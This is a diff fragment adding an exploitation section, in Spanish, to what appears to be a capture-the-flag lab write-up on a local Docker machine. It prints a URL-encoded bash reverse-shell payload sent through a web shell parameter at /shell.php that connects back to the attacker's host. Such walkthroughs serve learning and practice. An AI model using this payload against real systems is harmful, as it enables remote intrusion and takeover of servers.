@@ -40,3 +40,12 @@ Me fijo en ese endpoint `/shell.php` que da error del servidor al acceder. Decid
 
 <img width="1709" height="314" alt="Screenshot_8" src="https://github.com/user-attachments/assets/0b86f4bb-2539-414d-9646-3611b9d16f8a" />
 
+## Fase de Explotación
+
+Una vez con el comando, decido crear una **Reverse Shell** pero codificada para que se pueda ejecutar desde la **URL**, ya que no me sirve de nada ver los usuarios porque la màquina no tiene un servidor `ssh` o `ftp`:
+```bash
+http://172.17.0.2/shell.php?parameter=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F1234%200%3E%261%27
+```
+
+<img width="636" height="176" alt="Screenshot_5" src="https://github.com/user-attachments/assets/48a780b3-7149-4e0c-a9d1-f5ea598a4318" />
+
